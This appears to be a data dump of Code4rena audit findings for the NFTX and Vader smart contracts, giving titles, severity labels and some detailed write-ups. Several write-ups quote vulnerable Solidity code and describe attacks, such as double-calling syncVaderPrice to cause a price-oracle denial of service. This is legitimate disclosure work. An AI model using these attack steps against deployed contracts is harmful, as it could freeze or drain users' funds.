[{"title": "Unnecessary check for a condition ", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/49", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Unnecessary check for a condition "}, {"title": "isContract() code is duplicated in multiple files ", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/48", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "isContract() code is duplicated in multiple files "}, {"title": "`buyAndSwap1155WETH` Does Not Work As Intended", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/45", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  leastwood   # Vulnerability details  ## Impact  The `buyAndSwap1155WETH` function in `NFTXMarketplaceZap` aims to facilitate buying and swapping `ERC1155` tokens within a single transaction. The function expects to transfer `WETH` tokens from the `msg.sender` account and use these tokens in purchasing vault tokens. However, the `_buyVaultToken` call in `buyAndSwap1155WETH` actually uses `msg.value` and not `maxWethIn`. As a result, the function will not work unless the user supplies both `WETH` and native `ETH` amounts, equivalent to the `maxWethIn` amount.  ## Proof of Concept  https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L284-L314 ``` function buyAndSwap1155WETH(   uint256 vaultId,    uint256[] memory idsIn,    uint256[] memory amounts,    uint256[] memory specificIds,    uint256 maxWethIn,    address[] calldata path,   address to ) public payable nonReentrant {   require(to != address(0));   require(idsIn.length != 0);   IERC20Upgradeable(address(WETH)).transferFrom(msg.sender, address(this), maxWethIn);   uint256 count;   for (uint256 i = 0; i < idsIn.length; i++) {       uint256 amount = amounts[i];       require(amount > 0, \"Transferring < 1\");       count += amount;   }   INFTXVault vault = INFTXVault(nftxFactory.vault(vaultId));   uint256 redeemFees = (vault.targetSwapFee() * specificIds.length) + (       vault.randomSwapFee() * (count - specificIds.length)   );   uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, msg.value, path);   _swap1155(vaultId, idsIn, amounts, specificIds, to);    emit Swap(count, swapAmounts[0], to);    // Return extras.   uint256 remaining = WETH.balanceOf(address(this));   WETH.transfer(to, remaining); } ```  ## Tools Used  Manual code review. Discussions with Kiwi.  ## Recommended Mitigation Steps  Consider updating the `buyAndSwap1155WETH` function such that the following line of code is used instead of [this](https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L306).  ``` uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, maxWethIn, path); ```  "}, {"title": "Inconsistency in fee distribution", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/41", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Inconsistency in fee distribution"}, {"title": "transfer return value is ignored", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/40", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  robee   # Vulnerability details  Need to use safeTransfer instead of transfer. As there are popular tokens, such as USDT that transfer/trasnferFrom method doesn\u2019t return anything. The transfer return value has to be checked (as there are some other tokens that returns false instead revert), that means you must   1. Check the transfer return value Another popular possibility is to add a whiteList. Those are the appearances (solidity file, line number, actual line):          NFTXStakingZap.sol, 401, IERC20Upgradeable(vault).transfer(to, minTokenIn-amountToken);          NFTXStakingZap.sol, 474, IERC20Upgradeable(token).transfer(msg.sender, IERC20Upgradeable(token).balanceOf(address(this)));          PalmNFTXStakingZap.sol, 190, pairedToken.transferFrom(msg.sender, address(this), wethIn);          PalmNFTXStakingZap.sol, 195, pairedToken.transfer(to, wethIn-amountEth);          PalmNFTXStakingZap.sol, 219, pairedToken.transferFrom(msg.sender, address(this), wethIn);          PalmNFTXStakingZap.sol, 224, pairedToken.transfer(to, wethIn-amountEth);          PalmNFTXStakingZap.sol, 316, IERC20Upgradeable(vault).transfer(to, minTokenIn-amountToken);          XTokenUpgradeable.sol, 54, baseToken.transfer(who, what);          NFTXFlashSwipe.sol, 51, IERC20Upgradeable(vault).transferFrom(msg.sender, address(this), mintFee + targetRedeemFee);    "}, {"title": "Missing non reentrancy modifier", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/37", "labels": ["bug", "2 (Med Risk)", "sponsor disputed"], "target": "2021-12-nftx-findings", "body": "Missing non reentrancy modifier"}, {"title": "Two Steps Verification before Transferring Ownership", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/36", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Two Steps Verification before Transferring Ownership"}, {"title": "Named return issue", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/34", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Named return issue"}, {"title": "Init frontrun", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/33", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Init frontrun"}, {"title": "safeApprove of openZeppelin is deprecated", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/31", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "safeApprove of openZeppelin is deprecated"}, {"title": "Require with not comprehensive message", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/30", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Require with not comprehensive message"}, {"title": "Require with empty message", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/29", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Require with empty message"}, {"title": "Unnecessary array boundaries check when loading an array element twice", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/25", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Unnecessary array boundaries check when loading an array element twice"}, {"title": "Public functions to external", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/23", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Public functions to external"}, {"title": "Storage double reading. Could save SLOAD", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/22", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Storage double reading. Could save SLOAD"}, {"title": "Short the following require messages", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/21", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Short the following require messages"}, {"title": "Use bytes32 instead of string to save gas whenever possible", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/20", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Use bytes32 instead of string to save gas whenever possible"}, {"title": "Unused imports", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/19", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "Unused imports"}, {"title": "DOS on withdrawal", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/13", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "DOS on withdrawal"}, {"title": "Gas savings", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/11", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Gas savings"}, {"title": "Gas saving by using mapping instead of computeAddress", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/7", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Gas saving by using mapping instead of computeAddress"}, {"title": "Gas saving by storing modulesCopy.length in local variable", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/5", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-nftx-findings", "body": "Gas saving by storing modulesCopy.length in local variable"}, {"title": "buyAndSwap1155WETH() function may cause loss of user assets", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/2", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  cccz   # Vulnerability details  ## Impact  In the NFTXMarketplaceZap.sol contract, the buyAndSwap1155WETH function uses the WETH provided by the user to exchange VaultToken, but when executing the _buyVaultToken method, msg.value is used instead of maxWethIn. Since msg.value is 0, the call will fail.  ``` function buyAndSwap1155WETH(   uint256 vaultId,   uint256[] memory idsIn,   uint256[] memory amounts,   uint256[] memory specificIds,   uint256 maxWethIn,   address[] calldata path,   address to ) public payable nonReentrant {   require(to != address(0));   require(idsIn.length != 0);   IERC20Upgradeable(address(WETH)).transferFrom(msg.sender, address(this), maxWethIn);   uint256 count;   for (uint256 i = 0; i <idsIn.length; i++) {       uint256 amount = amounts[i];       require(amount> 0, \"Transferring <1\");       count += amount;   }   INFTXVault vault = INFTXVault(nftxFactory.vault(vaultId));   uint256 redeemFees = (vault.targetSwapFee() * specificIds.length) + (       vault.randomSwapFee() * (count-specificIds.length)   );   uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, msg.value, path); ```  In extreme cases, when the user provides both ETH and WETH (the user approves the contract WETH in advance and calls the buyAndSwap1155WETH function instead of the buyAndSwap1155 function by mistake), the _buyVaultToken function will execute successfully, but because the buyAndSwap1155WETH function will not convert ETH to WETH, The user\u2019s ETH will be locked in the contract, causing loss of user assets.  ```    function _buyVaultToken(      address vault,      uint256 minTokenOut,      uint256 maxWethIn,      address[] calldata path    ) internal returns (uint256[] memory) {      uint256[] memory amounts = sushiRouter.swapTokensForExactTokens(        minTokenOut,        maxWethIn,        path,        address(this),        block.timestamp      );       return amounts;    } ```   ## Tools Used  Manual audit  ## Recommended Mitigation Steps   ``` - uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, msg.value, path); + uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, maxWethIn, path); ```  "}, {"title": "Shorter revert messages", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/188", "labels": ["bug", "duplicate", "G (Gas Optimization)", "sponsor acknowledged", "LiquidityBasedTWAP"], "target": "2021-12-vader-findings", "body": "Shorter revert messages"}, {"title": "Avoid repeated calculations", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/187", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged", "LiquidityBasedTWAP"], "target": "2021-12-vader-findings", "body": "Avoid repeated calculations"}, {"title": "_addUSDVPair can also update", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/185", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed", "LiquidityBasedTWAP"], "target": "2021-12-vader-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact function _addUSDVPair does not check if the foreignAsset does not exist yet, thus it is possible to override it.   ## Recommended Mitigation Steps Make sure this is the intended behavior or else add validations, e.g. ```solidity   require(pairData.updatePeriod == 0, \"...\"); ```  "}, {"title": "Open TODOs in Codebase", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/183", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-12-vader-findings", "body": "Open TODOs in Codebase"}, {"title": "setGasThrottle function should be moved to BasePoolV2", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/181", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged", "VaderPoolV2", "BasePoolV2"], "target": "2021-12-vader-findings", "body": "setGasThrottle function should be moved to BasePoolV2"}, {"title": "Using single total native reserve variable for synth and non-synth reserves of VaderPoolV2 can lead to losses for synth holders", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/179", "labels": ["bug", "3 (High Risk)", "sponsor acknowledged", "VaderPoolV2"], "target": "2021-12-vader-findings", "body": "Using single total native reserve variable for synth and non-synth reserves of VaderPoolV2 can lead to losses for synth holders"}, {"title": "VaderPoolV2 doesn't implement queue system yet", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/178", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged", "VaderPoolV2"], "target": "2021-12-vader-findings", "body": "VaderPoolV2 doesn't implement queue system yet"}, {"title": "Redundant Constant Inheritance", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/176", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged", "LPWrapper"], "target": "2021-12-vader-findings", "body": "Redundant Constant Inheritance"}, {"title": "Changing function visibility from public to external can save gas", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/175", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged", "VaderPoolV2"], "target": "2021-12-vader-findings", "body": "Changing function visibility from public to external can save gas"}, {"title": "Incorrect descriptions of BasePoolV2's _onlyRouter and _supportedToken", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/172", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged", "BasePoolV2"], "target": "2021-12-vader-findings", "body": "Incorrect descriptions of BasePoolV2's _onlyRouter and _supportedToken"}, {"title": "Open Discussion That Hint Potential Security Problem Should be Avoided", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/167", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged", "LiquidityBasedTWAP"], "target": "2021-12-vader-findings", "body": "Open Discussion That Hint Potential Security Problem Should be Avoided"}, {"title": "`USDV.sol` Mint and Burn Amounts Are Incorrect", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/164", "labels": ["bug", "3 (High Risk)", "sponsor disputed", "USDV"], "target": "2021-12-vader-findings", "body": "`USDV.sol` Mint and Burn Amounts Are Incorrect"}, {"title": "Adding pair of the same `foreignAsset` would replace oracle of earlier entry", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/160", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "LiquidityBasedTWAP"], "target": "2021-12-vader-findings", "body": "# Handle  gzeon   # Vulnerability details  ## Impact Oracles are mapped to the `foreignAsset` but not to the specific pair. Pairs with the same `foreignAsset` (e.g. UniswapV2 and Sushi) will be forced to use the same oracle. Generally this should be the expected behavior but there are also possibility that while adding a new pair changed the oracle of an older pair unexpectedly.  ## Proof of Concept https://github.com/code-423n4/2021-12-vader/blob/9fb7f206eaff1863aeeb8f997e0f21ea74e78b49/contracts/lbt/LiquidityBasedTWAP.sol#L271 ```         oracles[foreignAsset] = oracle; ```  ## Recommended Mitigation Steps Bind the oracle to pair instead  "}, {"title": "`uint a = b++;` is a confusing syntax and can be gas-optimized", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/157", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged", "BasePoolV2"], "target": "2021-12-vader-findings", "body": "`uint a = b++;` is a confusing syntax and can be gas-optimized"}, {"title": "Keccak functions in constants waste gas", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/152", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged", "GovernorAlpha"], "target": "2021-12-vader-findings", "body": "Keccak functions in constants waste gas"}, {"title": "Missing boundary check in USDV.sol", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/151", "labels": ["bug", "G (Gas Optimization)", "USDV"], "target": "2021-12-vader-findings", "body": "Missing boundary check in USDV.sol"}, {"title": "Vader TWAP averages wrong", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/148", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "LiquidityBasedTWAP"], "target": "2021-12-vader-findings", "body": "# Handle  cmichel   # Vulnerability details  The vader price in `LiquidityBasedTWAP.getVaderPrice` is computed using the `pastLiquidityWeights` and `pastTotalLiquidityWeight` return values of the `syncVaderPrice`.  The `syncVaderPrice` function does not initialize all weights and the total liquidity weight does not equal the sum of the individual weights because it skips initializing the pair with the previous data if the TWAP update window has not been reached yet:  ```solidity function syncVaderPrice()     public     override     returns (         uint256[] memory pastLiquidityWeights,         uint256 pastTotalLiquidityWeight     ) {     uint256 _totalLiquidityWeight;     uint256 totalPairs = vaderPairs.length;     pastLiquidityWeights = new uint256[](totalPairs);     pastTotalLiquidityWeight = totalLiquidityWeight[uint256(Paths.VADER)];      for (uint256 i; i < totalPairs; ++i) {         IUniswapV2Pair pair = vaderPairs[i];         ExchangePair storage pairData = twapData[address(pair)];         // @audit-info lastMeasurement is set in _updateVaderPrice to block.timestamp         uint256 timeElapsed = block.timestamp - pairData.lastMeasurement;         // @audit-info update period depends on pair         // @audit-issue if update period not reached => does not initialize pastLiquidityWeights[i]         if (timeElapsed < pairData.updatePeriod) continue;          uint256 pastLiquidityEvaluation = pairData.pastLiquidityEvaluation;         uint256 currentLiquidityEvaluation = _updateVaderPrice(             pair,             pairData,             timeElapsed         );          pastLiquidityWeights[i] = pastLiquidityEvaluation;          pairData.pastLiquidityEvaluation = currentLiquidityEvaluation;          _totalLiquidityWeight += currentLiquidityEvaluation;     }      totalLiquidityWeight[uint256(Paths.VADER)] = _totalLiquidityWeight; } ```  #### POC This bug leads to several different issues. A big one is that an attacker can break the price functions and make them revert. Observe what happens if an attacker calls `syncVaderPrice` twice in the same block:  - The first time any pairs that need to be updated are updated - On the second call `_totalLiquidityWeight` is initialized to zero and all pairs have already been updated and thus skipped. `_totalLiquidityWeight` never increases and the storage variable `totalLiquidityWeight[uint256(Paths.VADER)] = _totalLiquidityWeight = 0;` is set to zero. - DoS because calls to `getStaleVaderPrice` / `getVaderPrice` will revert in `_calculateVaderPrice` which divides by `totalLiquidityWeight = 0`.  Attacker keeps double-calling `syncVaderPrice` every time an update window of one of the pairs becomes eligible to be updated.   ## Impact This bug leads to using wrong averaging and ignoring entire pairs due to their weights being initialized to zero and never being changed if the update window is not met. This in turn makes it easier to manipulate the price as potentially only a single pair needs to be price-manipulated.  It's also possible to always set the `totalLiquidityWeight` to zero by calling `syncVaderPrice` twice which in turn reverts all transactions making use of the price because of a division by zero in `_caluclateVaderPrice`. An attacker can break the `USDV.mint` minting forever and any router calls to `VaderReserve.reimburseImpermanentLoss` also fail as they perform a call to the reverting price function.  ## Recommended Mitigation Steps Even if `timeElapsed < pairData.updatePeriod`, the old pair weight should still contribute to the total liquidity weight and be set in `pastLiquidityWeights`. Move the `_totalLiquidityWeight += currentLiquidityEvaluation` and the `pastLiquidityWeights[i] = pastLiquidityEvaluation` assignments before the `continue`.   "}, {"title": "`VaderPoolV2` minting synths & fungibles can be frontrun", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/147", "labels": ["bug", "3 (High Risk)", "sponsor acknowledged", "VaderPoolV2"], "target": "2021-12-vader-findings", "body": "`VaderPoolV2` minting synths & fungibles can be frontrun"}, {"title": "mintSynth might mint nothing", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/142", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged", "VaderPoolV2"], "target": "2021-12-vader-findings", "body": "mintSynth might mint nothing"}, {"title": "Lack of address(0) check", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/140", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-12-vader-findings", "body": "Lack of address(0) check"}, {"title": "vader can be initialized twice", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/139", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed", "LiquidityBasedTWAP"], "target": "2021-12-vader-findings", "body": "# Handle  danb   # Vulnerability details  https://github.com/code-423n4/2021-12-vader/blob/main/contracts/lbt/LiquidityBasedTWAP.sol#L221 vader can be initialized twice if in the first call to `setupVader`, `vaderPrice == 0`.  ## Recommended Mitigation Steps add: ``` require(vaderPrice > 0); ``` in `setupVader`.  "}, {"title": "Lack Of Router Setter Function", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/137", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged", "BasePoolV2"], "target": "2021-12-vader-findings", "body": "Lack Of Router Setter Function"}, {"title": "loss of precision", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/134", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged", "LiquidityBasedTWAP"], "target": "2021-12-vader-findings", "body": "loss of precision"}, {"title": "Internal\u00a0functions can be\u00a0private if the contract is not herited", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/133", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-vader-findings", "body": "Internal\u00a0functions can be\u00a0private if the contract is not herited"}, {"title": "Save Gas With The Unchecked Keyword", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/130", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged", "VaderPoolV2"], "target": "2021-12-vader-findings", "body": "Save Gas With The Unchecked Keyword"}, {"title": "Lack of decimal control in StakingRewards", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/129", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged", "StakingRewards"], "target": "2021-12-vader-findings", "body": "Lack of decimal control in StakingRewards"}, {"title": "Lack of check of inputs in StakingRewards", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/128", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged", "StakingRewards"], "target": "2021-12-vader-findings", "body": "Lack of check of inputs in StakingRewards"}, {"title": "Explicit initialization with zero not required", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/126", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-vader-findings", "body": "Explicit initialization with zero not required"}, {"title": "`++i` costs less gass compared to `i++`", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/123", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-vader-findings", "body": "`++i` costs less gass compared to `i++`"}, {"title": "An array's length should be cached to save gas in for-loops", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/122", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-vader-findings", "body": "An array's length should be cached to save gas in for-loops"}, {"title": "SafeMath is not needed when using Solidity version 0.8.*", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/120", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged", "StakingRewards"], "target": "2021-12-vader-findings", "body": "SafeMath is not needed when using Solidity version 0.8.*"}, {"title": "USDV LockCreated event should include the index of a created lock", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/117", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged", "USDV"], "target": "2021-12-vader-findings", "body": "USDV LockCreated event should include the index of a created lock"}, {"title": "Less than 256 uints are not gas efficient", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/115", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-vader-findings", "body": "Less than 256 uints are not gas efficient"}, {"title": "transferOwnership should be two step process", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/113", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-12-vader-findings", "body": "transferOwnership should be two step process"}, {"title": "`> 0` can be replaced with `!= 0` for gas optimization", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/112", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-vader-findings", "body": "`> 0` can be replaced with `!= 0` for gas optimization"}, {"title": "SHOULD CHECK RETURN DATA FROM CHAINLINK AGGREGATORS (Timestamp)", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/111", "labels": ["bug", "1 (Low Risk)", "sponsor disputed", "LiquidityBasedTWAP"], "target": "2021-12-vader-findings", "body": "SHOULD CHECK RETURN DATA FROM CHAINLINK AGGREGATORS (Timestamp)"}, {"title": "Out of gas.", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/110", "labels": ["bug", "1 (Low Risk)", "sponsor disputed", "LiquidityBasedTWAP"], "target": "2021-12-vader-findings", "body": "Out of gas."}, {"title": "`USDV.claim` Does Not Check If Index Is Valid", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/106", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "sponsor acknowledged", "USDV"], "target": "2021-12-vader-findings", "body": "`USDV.claim` Does Not Check If Index Is Valid"}, {"title": "`totalLiquidityWeight` Is Updated When Adding New Token Pairs Which Skews Price Data For `getVaderPrice` and `getUSDVPrice`", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/105", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "LiquidityBasedTWAP"], "target": "2021-12-vader-findings", "body": "# Handle  leastwood   # Vulnerability details  ## Impact  The `_addVaderPair` function is called by the `onlyOwner` role. The relevant data in the `twapData` mapping is set by querying the respective liquidity pool and Chainlink oracle. `totalLiquidityWeight` for the `VADER` path is also incremented by the `pairLiquidityEvaluation` amount (calculated within `_addVaderPair`). If a user then calls `syncVaderPrice`, the recently updated `totalLiquidityWeight` will be taken into consideration when iterating through all token pairs eligible for price updates to calculate the liquidity weight for each token pair. This data is stored in `pastTotalLiquidityWeight` and `pastLiquidityWeights` respectively.  As a result, newly added token pairs will increase `pastTotalLiquidityWeight` while leaving `pastLiquidityWeights` underrepresented. This only occurs if `syncVaderPrice` is called before the update period for the new token has not been passed.  This issue also affects how the price for `USDV` is synced.  ## Proof of Concept  https://github.com/code-423n4/2021-12-vader/blob/main/contracts/lbt/LiquidityBasedTWAP.sol#L299 ``` function _addVaderPair(     IUniswapV2Pair pair,     IAggregatorV3 oracle,     uint256 updatePeriod ) internal {     require(         updatePeriod != 0,         \"LBTWAP::addVaderPair: Incorrect Update Period\"     );      require(oracle.decimals() == 8, \"LBTWAP::addVaderPair: Non-USD Oracle\");      ExchangePair storage pairData = twapData[address(pair)];      bool isFirst = pair.token0() == vader;      (address nativeAsset, address foreignAsset) = isFirst         ? (pair.token0(), pair.token1())         : (pair.token1(), pair.token0());      oracles[foreignAsset] = oracle;      require(nativeAsset == vader, \"LBTWAP::addVaderPair: Unsupported Pair\");      pairData.foreignAsset = foreignAsset;     pairData.foreignUnit = uint96(         10**uint256(IERC20Metadata(foreignAsset).decimals())     );      pairData.updatePeriod = updatePeriod;     pairData.lastMeasurement = block.timestamp;      pairData.nativeTokenPriceCumulative = isFirst         ? pair.price0CumulativeLast()         : pair.price1CumulativeLast();      (uint256 reserve0, uint256 reserve1, ) = pair.getReserves();      (uint256 reserveNative, uint256 reserveForeign) = isFirst         ? (reserve0, reserve1)         : (reserve1, reserve0);      uint256 pairLiquidityEvaluation = (reserveNative *         previousPrices[uint256(Paths.VADER)]) +         (reserveForeign * getChainlinkPrice(foreignAsset));      pairData.pastLiquidityEvaluation = pairLiquidityEvaluation;      totalLiquidityWeight[uint256(Paths.VADER)] += pairLiquidityEvaluation;      vaderPairs.push(pair);      if (maxUpdateWindow < updatePeriod) maxUpdateWindow = updatePeriod; } ```  https://github.com/code-423n4/2021-12-vader/blob/main/contracts/lbt/LiquidityBasedTWAP.sol#L113-L148 ``` function syncVaderPrice()     public     override     returns (         uint256[] memory pastLiquidityWeights,         uint256 pastTotalLiquidityWeight     ) {     uint256 _totalLiquidityWeight;     uint256 totalPairs = vaderPairs.length;     pastLiquidityWeights = new uint256[](totalPairs);     pastTotalLiquidityWeight = totalLiquidityWeight[uint256(Paths.VADER)];      for (uint256 i; i < totalPairs; ++i) {         IUniswapV2Pair pair = vaderPairs[i];         ExchangePair storage pairData = twapData[address(pair)];         uint256 timeElapsed = block.timestamp - pairData.lastMeasurement;          if (timeElapsed < pairData.updatePeriod) continue;          uint256 pastLiquidityEvaluation = pairData.pastLiquidityEvaluation;         uint256 currentLiquidityEvaluation = _updateVaderPrice(             pair,             pairData,             timeElapsed         );          pastLiquidityWeights[i] = pastLiquidityEvaluation;          pairData.pastLiquidityEvaluation = currentLiquidityEvaluation;          _totalLiquidityWeight += currentLiquidityEvaluation;     }      totalLiquidityWeight[uint256(Paths.VADER)] = _totalLiquidityWeight; } ```  As shown above, `pastTotalLiquidityWeight = totalLiquidityWeight[uint256(Paths.VADER)]` loads in the total liquidity weight which is updated when `_addVaderPair` is called. However, `pastLiquidityWeights` is calculated by iterating through each token pair that is eligible to be updated.  ## Tools Used  Manual code review.  ## Recommended Mitigation Steps  Consider removing the line `totalLiquidityWeight[uint256(Paths.VADER)] += pairLiquidityEvaluation;` in `_addVaderPair` so that newly added tokens do not impact upcoming queries for `VADER/USDV` price data. This should ensure `syncVaderPrice` and `syncUSDVPrice` cannot be manipulated when adding new tokens.  "}, {"title": "No Method To Remove Token Pairs", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/104", "labels": ["bug", "duplicate", "1 (Low Risk)", "LiquidityBasedTWAP"], "target": "2021-12-vader-findings", "body": "No Method To Remove Token Pairs"}, {"title": "`previousPrices` Is Never Updated Upon Syncing Token Price", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/103", "labels": ["bug", "3 (High Risk)", "sponsor acknowledged"], "target": "2021-12-vader-findings", "body": "`previousPrices` Is Never Updated Upon Syncing Token Price"}, {"title": "`_addVaderPair` and `_addUSDVPair` Does Not Check For Duplicate Token Pairs", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/102", "labels": ["bug", "1 (Low Risk)", "LiquidityBasedTWAP"], "target": "2021-12-vader-findings", "body": "`_addVaderPair` and `_addUSDVPair` Does Not Check For Duplicate Token 